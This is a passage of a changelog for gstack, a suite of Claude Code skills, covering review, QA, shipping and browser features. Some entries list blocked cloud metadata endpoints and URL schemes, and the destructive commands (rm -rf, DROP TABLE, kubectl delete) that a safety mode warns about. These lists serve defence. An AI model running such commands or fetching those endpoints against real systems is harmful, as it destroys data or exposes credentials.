- **`/ship` reads CLAUDE.md to discover test commands** instead of hardcoding `bin/test-lane` and `npm run test`. If no test commands are found, it asks the user and persists the answer to CLAUDE.md.

### Added

- **Platform-agnostic design principle** codified in CLAUDE.md. skills must read project config, never hardcode framework commands.
- **`## Testing` section** in CLAUDE.md for `/ship` test command discovery.

## [0.8.4] - 2026-03-19

### Added

- **`/ship` now automatically syncs your docs.** After creating the PR, `/ship` runs `/document-release` as Step 8.5. README, ARCHITECTURE, CONTRIBUTING, and CLAUDE.md all stay current without an extra command. No more stale docs after shipping.
- **Six new skills in the docs.** README, docs/skills.md, and BROWSER.md now cover `/codex` (multi-AI second opinion), `/careful` (destructive command warnings), `/freeze` (directory-scoped edit lock), `/guard` (full safety mode), `/unfreeze`, and `/gstack-upgrade`. The sprint skill table keeps its 15 specialists; a new "Power tools" section covers the rest.
- **Browse handoff documented everywhere.** BROWSER.md command table, docs/skills.md deep-dive, and README "What's new" all explain `$B handoff` and `$B resume` for CAPTCHA/MFA/auth walls.
- **Proactive suggestions know about all skills.** Root SKILL.md.tmpl now suggests `/codex`, `/careful`, `/freeze`, `/guard`, `/unfreeze`, and `/gstack-upgrade` at the right workflow stages.

## [0.8.3] - 2026-03-19

### Added

- **Plan reviews now guide you to the next step.** After running `/plan-ceo-review`, `/plan-eng-review`, or `/plan-design-review`, you get a recommendation for what to run next. eng review is always suggested as the required shipping gate, design review is suggested when UI changes are detected, and CEO review is softly mentioned for big product changes. No more remembering the workflow yourself.
- **Reviews know when they're stale.** Each review now records the commit it was run at. The dashboard compares that against your current HEAD and tells you exactly how many commits have elapsed. "eng review may be stale. 13 commits since review" instead of guessing.
- **`skip_eng_review` respected everywhere.** If you've opted out of eng review globally, the chaining recommendations won't nag you about it.
- **Design review lite now tracks commits too.** The lightweight design check that runs inside `/review` and `/ship` gets the same staleness tracking as full reviews.

### Fixed

- **Browse no longer navigates to dangerous URLs.** `goto`, `diff`, and `newtab` now block `file://`, `javascript:`, `data:` schemes and cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`). Localhost and private IPs are still allowed for local QA testing. (Closes #17)
- **Setup script tells you what's missing.** Running `./setup` without `bun` installed now shows a clear error with install instructions instead of a cryptic "command not found." (Closes #147)
- **`/debug` renamed to `/investigate`.** Claude Code has a built-in `/debug` command that shadowed the gstack skill. The systematic root-cause debugging workflow now lives at `/investigate`. (Closes #190)
- **Shell injection surface reduced.** gstack-slug output is now sanitized to `[a-zA-Z0-9._-]` only, making both `eval` and `source` callers safe. (Closes #133)
- **25 new security tests.** URL validation (16 tests) and path traversal validation (14 tests) now have dedicated unit test suites covering scheme blocking, metadata IP blocking, directory escapes, and prefix collision edge cases.

## [0.8.2] - 2026-03-19

### Added

- **Hand off to a real Chrome when the headless browser gets stuck.** Hit a CAPTCHA, auth wall, or MFA prompt? Run `$B handoff "reason"` and a visible Chrome opens at the exact same page with all your cookies and tabs intact. Solve the problem, tell Claude you're done, and `$B resume` picks up right where you left off with a fresh snapshot.
- **Auto-handoff hint after 3 consecutive failures.** If the browse tool fails 3 times in a row, it suggests using `handoff`. so you don't waste time watching the AI retry a CAPTCHA.
- **15 new tests for the handoff feature.** Unit tests for state save/restore, failure tracking, edge cases, plus integration tests for the full headless-to-headed flow with cookie and tab preservation.

### Changed

- `recreateContext()` refactored to use shared `saveState()`/`restoreState()` helpers. same behavior, less code, ready for future state persistence features.
- `browser.close()` now has a 5-second timeout to prevent hangs when closing headed browsers on macOS.

## [0.8.1] - 2026-03-19

### Fixed

- **`/qa` no longer refuses to use the browser on backend-only changes.** Previously, if your branch only changed prompt templates, config files, or service logic, `/qa` would analyze the diff, conclude "no UI to test," and suggest running evals instead. Now it always opens the browser -- falling back to a Quick mode smoke test (homepage + top 5 navigation targets) when no specific pages are identified from the diff.

## [0.8.0] - 2026-03-19. Multi-AI Second Opinion

**`/codex`. get an independent second opinion from a completely different AI.**

Three modes. `/codex review` runs OpenAI's Codex CLI against your diff and gives a pass/fail gate. if Codex finds critical issues (`[P1]`), it fails. `/codex challenge` goes adversarial: it tries to find ways your code will fail in production, thinking like an attacker and a chaos engineer. `/codex <anything>` opens a conversation with Codex about your codebase, with session continuity so follow-ups remember context.

When both `/review` (Claude) and `/codex review` have run, you get a cross-model analysis showing which findings overlap and which are unique to each AI. building intuition for when to trust which system.

**Integrated everywhere.** After `/review` finishes, it offers a Codex second opinion. During `/ship`, you can run Codex review as an optional gate before pushing. In `/plan-eng-review`, Codex can independently critique your plan before the engineering review begins. All Codex results show up in the Review Readiness Dashboard.

**Also in this release:** Proactive skill suggestions. gstack now notices what stage of development you're in and suggests the right skill. Don't like it? Say "stop suggesting" and it remembers across sessions.

## [0.7.4] - 2026-03-18

### Changed

- **`/qa` and `/design-review` now ask what to do with uncommitted changes** instead of refusing to start. When your working tree is dirty, you get an interactive prompt with three options: commit your changes, stash them, or abort. No more cryptic "ERROR: Working tree is dirty" followed by a wall of text.

## [0.7.3] - 2026-03-18

### Added

- **Safety guardrails you can turn on with one command.** Say "be careful" or "safety mode" and `/careful` will warn you before any destructive command. `rm -rf`, `DROP TABLE`, force-push, `kubectl delete`, and more. You can override every warning. Common build artifact cleanups (`rm -rf node_modules`, `dist`, `.next`) are whitelisted.
- **Lock edits to one folder with `/freeze`.** Debugging something and don't want Claude to "fix" unrelated code? `/freeze` blocks all file edits outside a directory you choose. Hard block, not just a warning. Run `/unfreeze` to remove the restriction without ending your session.
- **`/guard` activates both at once.** One command for maximum safety when touching prod or live systems. destructive command warnings plus directory-scoped edit restrictions.
- **`/debug` now auto-freezes edits to the module being debugged.** After forming a root cause hypothesis, `/debug` locks edits to the narrowest affected directory. No more accidental "fixes" to unrelated code during debugging.
- **You can now see which skills you use and how often.** Every skill invocation is logged locally to `~/.gstack/analytics/skill-usage.jsonl`. Run `bun run analytics` to see your top skills, per-repo breakdown, and how often safety hooks actually catch something. Data stays on your machine.
- **Weekly retros now include skill usage.** `/retro` shows which skills you used during the retro window alongside your usual commit analysis and metrics.

## [0.7.2] - 2026-03-18

### Fixed

- `/retro` date ranges now align to midnight instead of the current time. Running `/retro` at 9pm no longer silently drops the morning of the start date. you get full calendar days.
- `/retro` timestamps now use your local timezone instead of hardcoded Pacific time. Users outside the US-West coast get correct local hours in histograms, session detection, and streak tracking.

## [0.7.1] - 2026-03-19

### Added

- **gstack now suggests skills at natural moments.** You don't need to know slash commands. just talk about what you're doing. Brainstorming an idea? gstack suggests `/office-hours`. Something's broken? It suggests `/debug`. Ready to deploy? It suggests `/ship`. Every workflow skill now has proactive triggers that fire when the moment is right.
- **Lifecycle map.** gstack's root skill description now includes a developer workflow guide mapping 12 stages (brainstorm → plan → review → code → debug → test → ship → docs → retro) to the right skill. Claude sees this in every session.
- **Opt-out with natural language.** If proactive suggestions feel too aggressive, just say "stop suggesting things". gstack remembers across sessions. Say "be proactive again" to re-enable.
- **11 journey-stage E2E tests.** Each test simulates a real moment in the developer lifecycle with realistic project context (plan.md, error logs, git history, code) and verifies the right skill fires from natural language alone. 11/11 pass.
- **Trigger phrase validation.** Static tests verify every workflow skill has "Use when" and "Proactively suggest" phrases. catches regressions for free.

### Fixed

- `/debug` and `/office-hours` were completely invisible to natural language. no trigger phrases at all. Now both have full reactive + proactive triggers.

## [0.7.0] - 2026-03-18. YC Office Hours

**`/office-hours`. sit down with a YC partner before you write a line of code.**

Two modes. If you're building a startup, you get six forcing questions distilled from how YC evaluates products: demand reality, status quo, desperate specificity, narrowest wedge, observation & surprise, and future-fit. If you're hacking on a side project, learning to code, or at a hackathon, you get an enthusiastic brainstorming partner who helps you find the coolest version of your idea.

Both modes write a design doc that feeds directly into `/plan-ceo-review` and `/plan-eng-review`. After the session, the skill reflects back what it noticed about how you think. specific observations, not generic praise.

**`/debug`. find the root cause, not the symptom.**

When something is broken and you don't know why, `/debug` is your systematic debugger. It follows the Iron Law: no fixes without root cause investigation first. Traces data flow, matches against known bug patterns (race conditions, nil propagation, stale cache, config drift), and tests hypotheses one at a time. If 3 fixes fail, it stops and questions the architecture instead of thrashing.

## [0.6.4.1] - 2026-03-18

### Added

- **Skills now discoverable via natural language.** All 12 skills that were missing explicit trigger phrases now have them. say "deploy this" and Claude finds `/ship`, say "check my diff" and it finds `/review`. Following Anthropic's best practice: "the description field is not a summary. it's when to trigger."

## [0.6.4.0] - 2026-03-17

### Added

- **`/plan-design-review` is now interactive. rates 0-10, fixes the plan.** Instead of producing a report with letter grades, the designer now works like CEO and Eng review: rates each design dimension 0-10, explains what a 10 looks like, then edits the plan to get there. One AskUserQuestion per design choice. The output is a better plan, not a document about the plan.
- **CEO review now calls in the designer.** When `/plan-ceo-review` detects UI scope in a plan, it activates a Design & UX section (Section 11) covering information architecture, interaction state coverage, AI slop risk, and responsive intention. For deep design work, it recommends `/plan-design-review`.
- **14 of 15 skills now have full test coverage (E2E + LLM-judge + validation).** Added LLM-judge quality evals for 10 skills that were missing them: ship, retro, qa-only, plan-ceo-review, plan-eng-review, plan-design-review, design-review, design-consultation, document-release, gstack-upgrade. Added real E2E test for gstack-upgrade (was a `.todo`). Added design-consultation to command validation.
- **Bisect commit style.** CLAUDE.md now requires every commit to be a single logical change. renames separate from rewrites, test infrastructure separate from test implementations.

### Changed

- `/qa-design-review` renamed to `/design-review`. the "qa-" prefix was confusing now that `/plan-design-review` is plan-mode. Updated across all 22 files.

## [0.6.3.0] - 2026-03-17

### Added

- **Every PR touching frontend code now gets a design review automatically.** `/review` and `/ship` apply a 20-item design checklist against changed CSS, HTML, JSX, and view files. Catches AI slop patterns (purple gradients, 3-column icon grids, generic hero copy), typography issues (body text < 16px, blacklisted fonts), accessibility gaps (`outline: none`), and `!important` abuse. Mechanical CSS fixes are auto-applied; design judgment calls ask you first.
- **`gstack-diff-scope` categorizes what changed in your branch.** Run `source <(gstack-diff-scope main)` and get `SCOPE_FRONTEND=true/false`, `SCOPE_BACKEND`, `SCOPE_PROMPTS`, `SCOPE_TESTS`, `SCOPE_DOCS`, `SCOPE_CONFIG`. Design review uses it to skip silently on backend-only PRs. Ship pre-flight uses it to recommend design review when frontend files are touched.
- **Design review shows up in the Review Readiness Dashboard.** The dashboard now distinguishes between "LITE" (code-level, runs automatically in /review and /ship) and "FULL" (visual audit via /plan-design-review with browse binary). Both show up as Design Review entries.
- **E2E eval for design review detection.** Planted CSS/HTML fixtures with 7 known anti-patterns (Papyrus font, 14px body text, `outline: none`, `!important`, purple gradient, generic hero copy, 3-column feature grid). The eval verifies `/review` catches at least 4 of 7.

## [0.6.2.0] - 2026-03-17

### Added

- **Plan reviews now think like the best in the world.** `/plan-ceo-review` applies 14 cognitive patterns from Bezos (one-way doors, Day 1 proxy skepticism), Grove (paranoid scanning), Munger (inversion), Horowitz (wartime awareness), Chesky/Graham (founder mode), and Altman (leverage obsession). `/plan-eng-review` applies 15 patterns from Larson (team state diagnosis), McKinley (boring by default), Brooks (essential vs accidental complexity), Beck (make the change easy), Majors (own your code in production), and Google SRE (error budgets). `/plan-design-review` applies 12 patterns from Rams (subtraction default), Norman (time-horizon design), Zhuo (principled taste), Gebbia (design for trust, storyboard the journey), and Ive (care is visible).
- **Latent space activation, not checklists.** The cognitive patterns name-drop frameworks and people so the LLM draws on its deep knowledge of how they actually think. The instruction is "internalize these, don't enumerate them". making each review a genuine perspective shift, not a longer checklist.

## [0.6.1.0] - 2026-03-17

### Added

- **E2E and LLM-judge tests now only run what you changed.** Each test declares which source files it depends on. When you run `bun run test:e2e`, it checks your diff and skips tests whose dependencies weren't touched. A branch that only changes `/retro` now runs 2 tests instead of 31. Use `bun run test:e2e:all` to force everything.
- **`bun run eval:select` previews which tests would run.** See exactly which tests your diff triggers before spending API credits. Supports `--json` for scripting and `--base <branch>` to override the base branch.
- **Completeness guardrail catches forgotten test entries.** A free unit test validates that every `testName` in the E2E and LLM-judge test files has a corresponding entry in the TOUCHFILES map. New tests without entries fail `bun test` immediately. no silent always-run degradation.

### Changed

- `test:evals` and `test:e2e` now auto-select based on diff (was: all-or-nothing)
- New `test:evals:all` and `test:e2e:all` scripts for explicit full runs

## 0.6.1. 2026-03-17. Boil the Lake

Every gstack skill now follows the **Completeness Principle**: always recommend the
full implementation when AI makes the marginal cost near-zero. No more "Choose B
because it's 90% of the value" when option A is 70 lines more code.

Read the philosophy: https://garryslist.org/posts/boil-the-ocean

- **Completeness scoring**: every AskUserQuestion option now shows a completeness
  score (1-10), biasing toward the complete solution
- **Dual time estimates**: effort estimates show both human-team and CC+gstack time
  (e.g., "human: ~2 weeks / CC: ~1 hour") with a task-type compression reference table
- **Anti-pattern examples**: concrete "don't do this" gallery in the preamble so the
  principle isn't abstract
- **First-time onboarding**: new users see a one-time introduction linking to the
  essay, with option to open in browser
- **Review completeness gaps**: `/review` now flags shortcut implementations where the
  complete version costs <30 min CC time
- **Lake Score**: CEO and Eng review completion summaries show how many recommendations
  chose the complete option vs shortcuts
- **CEO + Eng review dual-time**: temporal interrogation, effort estimates, and delight
  opportunities all show both human and CC time scales

## 0.6.0.1. 2026-03-17

- **`/gstack-upgrade` now catches stale vendored copies automatically.** If your global gstack is up to date but the vendored copy in your project is behind, `/gstack-upgrade` detects the mismatch and syncs it. No more manually asking "did we vendor it?". it just tells you and offers to update.
- **Upgrade sync is safer.** If `./setup` fails while syncing a vendored copy, gstack restores the previous version from backup instead of leaving a broken install.

### For contributors

- Standalone usage section in `gstack-upgrade/SKILL.md.tmpl` now references Steps 2 and 4.5 (DRY) instead of duplicating detection/sync bash blocks. Added one new version-comparison bash block.
- Update check fallback in standalone mode now matches the preamble pattern (global path → local path → `|| true`).

## 0.6.0. 2026-03-17

- **100% test coverage is the key to great vibe coding.** gstack now bootstraps test frameworks from scratch when your project doesn't have one. Detects your runtime, researches the best framework, asks you to pick, installs it, writes 3-5 real tests for your actual code, sets up CI/CD (GitHub Actions), creates TESTING.md, and adds test culture instructions to CLAUDE.md. Every Claude Code session after that writes tests naturally.
- **Every bug fix now gets a regression test.** When `/qa` fixes a bug and verifies it, Phase 8e.5 automatically generates a regression test that catches the exact scenario that broke. Tests include full attribution tracing back to the QA report. Auto-incrementing filenames prevent collisions across sessions.
- **Ship with confidence. coverage audit shows what's tested and what's not.** `/ship` Step 3.4 builds a code path map from your diff, searches for corresponding tests, and produces an ASCII coverage diagram with quality stars (★★★ = edge cases + errors, ★★ = happy path, ★ = smoke test). Gaps get tests auto-generated. PR body shows "Tests: 42 → 47 (+5 new)".
- **Your retro tracks test health.** `/retro` now shows total test files, tests added this period, regression test commits, and trend deltas. If test ratio drops below 20%, it flags it as a growth area.
- **Design reviews generate regression tests too.** `/qa-design-review` Phase 8e.5 skips CSS-only fixes (those are caught by re-running the design audit) but writes tests for JavaScript behavior changes like broken dropdowns or animation failures.

### For contributors

- Added `generateTestBootstrap()` resolver to `gen-skill-docs.ts` (~155 lines). Registered as `{{TEST_BOOTSTRAP}}` in the RESOLVERS map. Inserted into qa, ship (Step 2.5), and qa-design-review templates.
- Phase 8e.5 regression test generation added to `qa/SKILL.md.tmpl` (46 lines) and CSS-aware variant to `qa-design-review/SKILL.md.tmpl` (12 lines). Rule 13 amended to allow creating new test files.
- Step 3.4 test coverage audit added to `ship/SKILL.md.tmpl` (88 lines) with quality scoring rubric and ASCII diagram format.
- Test health tracking added to `retro/SKILL.md.tmpl`: 3 new data gathering commands, metrics row, narrative section, JSON schema field.
- `qa-only/SKILL.md.tmpl` gets recommendation note when no test framework detected.
- `qa-report-template.md` gains Regression Tests section with deferred test specs.
- ARCHITECTURE.md placeholder table updated with `{{TEST_BOOTSTRAP}}` and `{{REVIEW_DASHBOARD}}`.
- WebSearch added to allowed-tools for qa, ship, qa-design-review.
- 26 new validation tests, 2 new E2E evals (bootstrap + coverage audit).
- 2 new P3 TODOs: CI/CD for non-GitHub providers, auto-upgrade weak tests.

## 0.5.4. 2026-03-17

- **Engineering review is always the full review now.** `/plan-eng-review` no longer asks you to choose between "big change" and "small change" modes. Every plan gets the full interactive walkthrough (architecture, code quality, tests, performance). Scope reduction is only suggested when the complexity check actually triggers. not as a standing menu option.
- **Ship stops asking about reviews once you've answered.** When `/ship` asks about missing reviews and you say "ship anyway" or "not relevant," that decision is saved for the branch. No more getting re-asked every time you re-run `/ship` after a pre-landing fix.

### For contributors

- Removed SMALL_CHANGE / BIG_CHANGE / SCOPE_REDUCTION menu from `plan-eng-review/SKILL.md.tmpl`. Scope reduction is now proactive (triggered by complexity check) rather than a menu item.
- Added review gate override persistence to `ship/SKILL.md.tmpl`. writes `ship-review-override` entries to `$BRANCH-reviews.jsonl` so subsequent `/ship` runs skip the gate.
- Updated 2 E2E test prompts to match new flow.

## 0.5.3. 2026-03-17

- **You're always in control. even when dreaming big.** `/plan-ceo-review` now presents every scope expansion as an individual decision you opt into. EXPANSION mode recommends enthusiastically, but you say yes or no to each idea. No more "the agent went wild and added 5 features I didn't ask for."
- **New mode: SELECTIVE EXPANSION.** Hold your current scope as the baseline, but see what else is possible. The agent surfaces expansion opportunities one by one with neutral recommendations. you cherry-pick the ones worth doing. Perfect for iterating on existing features where you want rigor but also want to be tempted by adjacent improvements.
- **Your CEO review visions are saved, not lost.** Expansion ideas, cherry-pick decisions, and 10x visions are now persisted to `~/.gstack/projects/{repo}/ceo-plans/` as structured design documents. Stale plans get archived automatically. If a vision is exceptional, you can promote it to `docs/designs/` in your repo for the team.

- **Smarter ship gates.** `/ship` no longer nags you about CEO and Design reviews when they're not relevant. Eng Review is the only required gate (and you can disable even that with `gstack-config set skip_eng_review true`). CEO Review is recommended for big product changes; Design Review for UI work. The dashboard still shows all three. it just won't block you for the optional ones.

### For contributors

- Added SELECTIVE EXPANSION mode to `plan-ceo-review/SKILL.md.tmpl` with cherry-pick ceremony, neutral recommendation posture, and HOLD SCOPE baseline.
- Rewrote EXPANSION mode's Step 0D to include opt-in ceremony. distill vision into discrete proposals, present each as AskUserQuestion.
- Added CEO plan persistence (0D-POST step): structured markdown with YAML frontmatter (`status: ACTIVE/ARCHIVED/PROMOTED`), scope decisions table, archival flow.
- Added `docs/designs` promotion step after Review Log.
- Mode Quick Reference table expanded to 4 columns.
- Review Readiness Dashboard: Eng Review required (overridable via `skip_eng_review` config), CEO/Design optional with agent judgment.
- New tests: CEO review mode validation (4 modes, persistence, promotion), SELECTIVE EXPANSION E2E test.

## 0.5.2. 2026-03-17

- **Your design consultant now takes creative risks.** `/design-consultation` doesn't just propose a safe, coherent system. it explicitly breaks down SAFE CHOICES (category baseline) vs. RISKS (where your product stands out). You pick which rules to break. Every risk comes with a rationale for why it works and what it costs.
- **See the landscape before you choose.** When you opt into research, the agent browses real sites in your space with screenshots and accessibility tree analysis. not just web search results. You see what's out there before making design decisions.
- **Preview pages that look like your product.** The preview page now renders realistic product mockups. dashboards with sidebar nav and data tables, marketing pages with hero sections, settings pages with forms. not just font swatches and color palettes.

## 0.5.1. 2026-03-17
- **Know where you stand before you ship.** Every `/plan-ceo-review`, `/plan-eng-review`, and `/plan-design-review` now logs its result to a review tracker. At the end of each review, you see a **Review Readiness Dashboard** showing which reviews are done, when they ran, and whether they're clean. with a clear CLEARED TO SHIP or NOT READY verdict.
- **`/ship` checks your reviews before creating the PR.** Pre-flight now reads the dashboard and asks if you want to continue when reviews are missing. Informational only. it won't block you, but you'll know what you skipped.
- **One less thing to copy-paste.** The SLUG computation (that opaque sed pipeline for computing `owner-repo` from git remote) is now a shared `bin/gstack-slug` helper. All 14 inline copies across templates replaced with `source <(gstack-slug)`. If the format ever changes, fix it once.
- **Screenshots are now visible during QA and browse sessions.** When gstack takes screenshots, they now show up as clickable image elements in your output. no more invisible `/tmp/browse-screenshot.png` paths you can't see. Works in `/qa`, `/qa-only`, `/plan-design-review`, `/qa-design-review`, `/browse`, and `/gstack`.

### For contributors

- Added `{{REVIEW_DASHBOARD}}` resolver to `gen-skill-docs.ts`. shared dashboard reader injected into 4 templates (3 review skills + ship).
- Added `bin/gstack-slug` helper (5-line bash) with unit tests. Outputs `SLUG=` and `BRANCH=` lines, sanitizes `/` to `-`.
- New TODOs: smart review relevance detection (P3), `/merge` skill for review-gated PR merge (P2).

## 0.5.0. 2026-03-16

- **Your site just got a design review.** `/plan-design-review` opens your site and reviews it like a senior product designer. typography, spacing, hierarchy, color, responsive, interactions, and AI slop detection. Get letter grades (A-F) per category, a dual headline "Design Score" + "AI Slop Score", and a structured first impression that doesn't pull punches.
- **It can fix what it finds, too.** `/qa-design-review` runs the same designer's eye audit, then iteratively fixes design issues in your source code with atomic `style(design):` commits and before/after screenshots. CSS-safe by default, with a stricter self-regulation heuristic tuned for styling changes.
- **Know your actual design system.** Both skills extract your live site's fonts, colors, heading scale, and spacing patterns via JS. then offer to save the inferred system as a `DESIGN.md` baseline. Finally know how many fonts you're actually using.
- **AI Slop detection is a headline metric.** Every report opens with two scores: Design Score and AI Slop Score. The AI slop checklist catches the 10 most recognizable AI-generated patterns. the 3-column feature grid, purple gradients, decorative blobs, emoji bullets, generic hero copy.
- **Design regression tracking.** Reports write a `design-baseline.json`. Next run auto-compares: per-category grade deltas, new findings, resolved findings. Watch your design score improve over time.
- **80-item design audit checklist** across 10 categories: visual hierarchy, typography, color/contrast, spacing/layout, interaction states, responsive, motion, content/microcopy, AI slop, and performance-as-design. Distilled from Vercel's 100+ rules, Anthropic's frontend design skill, and 6 other design frameworks.

### For contributors

- Added `{{DESIGN_METHODOLOGY}}` resolver to `gen-skill-docs.ts`. shared design audit methodology injected into both `/plan-design-review` and `/qa-design-review` templates, following the `{{QA_METHODOLOGY}}` pattern.
- Added `~/.gstack-dev/plans/` as a local plans directory for long-range vision docs (not checked in). CLAUDE.md and TODOS.md updated.
- Added `/setup-design-md` to TODOS.md (P2) for interactive DESIGN.md creation from scratch.

## 0.4.5. 2026-03-16

- **Review findings now actually get fixed, not just listed.** `/review` and `/ship` used to print informational findings (dead code, test gaps, N+1 queries) and then ignore them. Now every finding gets action: obvious mechanical fixes are applied automatically, and genuinely ambiguous issues are batched into a single question instead of 8 separate prompts. You see `[AUTO-FIXED] file:line Problem → what was done` for each auto-fix.
- **You control the line between "just fix it" and "ask me first."** Dead code, stale comments, N+1 queries get auto-fixed. Security issues, race conditions, design decisions get surfaced for your call. The classification lives in one place (`review/checklist.md`) so both `/review` and `/ship` stay in sync.

### Fixed

- **`$B js "const x = await fetch(...); return x.status"` now works.** The `js` command used to wrap everything as an expression. so `const`, semicolons, and multi-line code all broke. It now detects statements and uses a block wrapper, just like `eval` already did.
- **Clicking a dropdown option no longer hangs forever.** If an agent sees `@e3 [option] "Admin"` in a snapshot and runs `click @e3`, gstack now auto-selects that option instead of hanging on an impossible Playwright click. The right thing just happens.
- **When click is the wrong tool, gstack tells you.** Clicking an `<option>` via CSS selector used to time out with a cryptic Playwright error. Now you get: `"Use 'browse select' instead of 'click' for dropdown options."`

### For contributors

- Gate Classification → Severity Classification rename (severity determines presentation order, not whether you see a prompt).
- Fix-First Heuristic section added to `review/checklist.md`. the canonical AUTO-FIX vs ASK classification.
- New validation test: `Fix-First Heuristic exists in checklist and is referenced by review + ship`.
- Extracted `needsBlockWrapper()` and `wrapForEvaluate()` helpers in `read-commands.ts`. shared by both `js` and `eval` commands (DRY).
- Added `getRefRole()` to `BrowserManager`. exposes ARIA role for ref selectors without changing `resolveRef` return type.
- Click handler auto-routes `[role=option]` refs to `selectOption()` via parent `<select>`, with DOM `tagName` check to avoid blocking custom listbox components.
- 6 new tests: multi-line js, semicolons, statement keywords, simple expressions, option auto-routing, CSS option error guidance.

## 0.4.4. 2026-03-16

- **New releases detected in under an hour, not half a day.** The update check cache was set to 12 hours, which meant you could be stuck on an old version all day while new releases dropped. Now "you're up to date" expires after 60 minutes, so you'll see upgrades within the hour. "Upgrade available" still nags for 12 hours (that's the point).
- **`/gstack-upgrade` always checks for real.** Running `/gstack-upgrade` directly now bypasses the cache and does a fresh check against GitHub. No more "you're already on the latest" when you're not.

### For contributors

- Split `last-update-check` cache TTL: 60 min for `UP_TO_DATE`, 720 min for `UPGRADE_AVAILABLE`.
- Added `--force` flag to `bin/gstack-update-check` (deletes cache file before checking).
- 3 new tests: `--force` busts UP_TO_DATE cache, `--force` busts UPGRADE_AVAILABLE cache, 60-min TTL boundary test with `utimesSync`.

## 0.4.3. 2026-03-16

- **New `/document-release` skill.** Run it after `/ship` but before merging. it reads every doc file in your project, cross-references the diff, and updates README, ARCHITECTURE, CONTRIBUTING, CHANGELOG, and TODOS to match what you actually shipped. Risky changes get surfaced as questions; everything else is automatic.
- **Every question is now crystal clear, every time.** You used to need 3+ sessions running before gstack would give you full context and plain English explanations. Now every question. even in a single session. tells you the project, branch, and what's happening, explained simply enough to understand mid-context-switch. No more "sorry, explain it to me more simply."
- **Branch name is always correct.** gstack now detects your current branch at runtime instead of relying on the snapshot from when the conversation started. Switch branches mid-session? gstack keeps up.

### For contributors

- Merged ELI16 rules into base AskUserQuestion format. one format instead of two, no `_SESSIONS >= 3` conditional.
- Added `_BRANCH` detection to preamble bash block (`git branch --show-current` with fallback).
- Added regression guard tests for branch detection and simplification rules.

## 0.4.2. 2026-03-16

- **`$B js "await fetch(...)"` now just works.** Any `await` expression in `$B js` or `$B eval` is automatically wrapped in an async context. No more `SyntaxError: await is only valid in async functions`. Single-line eval files return values directly; multi-line files use explicit `return`.
- **Contributor mode now reflects, not just reacts.** Instead of only filing reports when something breaks, contributor mode now prompts periodic reflection: "Rate your gstack experience 0-10. Not a 10? Think about why." Catches quality-of-life issues and friction that passive detection misses. Reports now include a 0-10 rating and "What would make this a 10" to focus on actionable improvements.
- **Skills now respect your branch target.** `/ship`, `/review`, `/qa`, and `/plan-ceo-review` detect which branch your PR actually targets instead of assuming `main`. Stacked branches, Conductor workspaces targeting feature branches, and repos using `master` all just work now.
- **`/retro` works on any default branch.** Repos using `master`, `develop`, or other default branch names are detected automatically. no more empty retros because the branch name was wrong.
- **New `{{BASE_BRANCH_DETECT}}` placeholder** for skill authors. drop it into any template and get 3-step branch detection (PR base → repo default → fallback) for free.
- **3 new E2E smoke tests** validate base branch detection works end-to-end across ship, review, and retro skills.

### For contributors

- Added `hasAwait()` helper with comment-stripping to avoid false positives on `// await` in eval files.
- Smart eval wrapping: single-line → expression `(...)`, multi-line → block `{...}` with explicit `return`.
- 6 new async wrapping unit tests, 40 new contributor mode preamble validation tests.
- Calibration example framed as historical ("used to fail") to avoid implying a live bug post-fix.
- Added "Writing SKILL templates" section to CLAUDE.md. rules for natural language over bash-isms, dynamic branch detection, self-contained code blocks.
- Hardcoded-main regression test scans all `.tmpl` files for git commands with hardcoded `main`.
- QA template cleaned up: removed `REPORT_DIR` shell variable, simplified port detection to prose.
- gstack-upgrade template: explicit cross-step prose for variable references between bash blocks.

## 0.4.1. 2026-03-16

- **gstack now notices when it screws up.** Turn on contributor mode (`gstack-config set gstack_contributor true`) and gstack automatically writes up what went wrong. what you were doing, what broke, repro steps. Next time something annoys you, the bug report is already written. Fork gstack and fix it yourself.
- **Juggling multiple sessions? gstack keeps up.** When you have 3+ gstack windows open, every question now tells you which project, which branch, and what you were working on. No more staring at a question thinking "wait, which window is this?"
- **Every question now comes with a recommendation.** Instead of dumping options on you and making you think, gstack tells you what it would pick and why. Same clear format across every skill.
- **/review now catches forgotten enum handlers.** Add a new status, tier, or type constant? /review traces it through every switch statement, allowlist, and filter in your codebase. not just the files you changed. Catches the "added the value but forgot to handle it" class of bugs before they ship.

### For contributors

- Renamed `{{UPDATE_CHECK}}` to `{{PREAMBLE}}` across all 11 skill templates. one startup block now handles update check, session tracking, contributor mode, and question formatting.
- DRY'd plan-ceo-review and plan-eng-review question formatting to reference the preamble baseline instead of duplicating rules.
- Added CHANGELOG style guide and vendored symlink awareness docs to CLAUDE.md.

## 0.4.0. 2026-03-16

### Added
- **QA-only skill** (`/qa-only`). report-only QA mode that finds and documents bugs without making fixes. Hand off a clean bug report to your team without the agent touching your code.
- **QA fix loop**. `/qa` now runs a find-fix-verify cycle: discover bugs, fix them, commit, re-navigate to confirm the fix took. One command to go from broken to shipped.
- **Plan-to-QA artifact flow**. `/plan-eng-review` writes test-plan artifacts that `/qa` picks up automatically. Your engineering review now feeds directly into QA testing with no manual copy-paste.
- **`{{QA_METHODOLOGY}}` DRY placeholder**. shared QA methodology block injected into both `/qa` and `/qa-only` templates. Keeps both skills in sync when you update testing standards.
- **Eval efficiency metrics**. turns, duration, and cost now displayed across all eval surfaces with natural-language **Takeaway** commentary. See at a glance whether your prompt changes made the agent faster or slower.
- **`generateCommentary()` engine**. interprets comparison deltas so you don't have to: flags regressions, notes improvements, and produces an overall efficiency summary.
- **Eval list columns**. `bun run eval:list` now shows Turns and Duration per run. Spot expensive or slow runs instantly.
- **Eval summary per-test efficiency**. `bun run eval:summary` shows average turns/duration/cost per test across runs. Identify which tests are costing you the most over time.
- **`judgePassed()` unit tests**. extracted and tested the pass/fail judgment logic.
- **3 new E2E tests**. qa-only no-fix guardrail, qa fix loop with commit verification, plan-eng-review test-plan artifact.
- **Browser ref staleness detection**. `resolveRef()` now checks element count to detect stale refs after page mutations. SPA navigation no longer causes 30-second timeouts on missing elements.
- 3 new snapshot tests for ref staleness.

### Changed
- QA skill prompt restructured with explicit two-cycle workflow (find → fix → verify).
- `formatComparison()` now shows per-test turns and duration deltas alongside cost.
- `printSummary()` shows turns and duration columns.
- `eval-store.test.ts` fixed pre-existing `_partial` file assertion bug.

### Fixed
- Browser ref staleness. refs collected before page mutation (e.g. SPA navigation) are now detected and re-collected. Eliminates a class of flaky QA failures on dynamic sites.

## 0.3.9. 2026-03-15

### Added
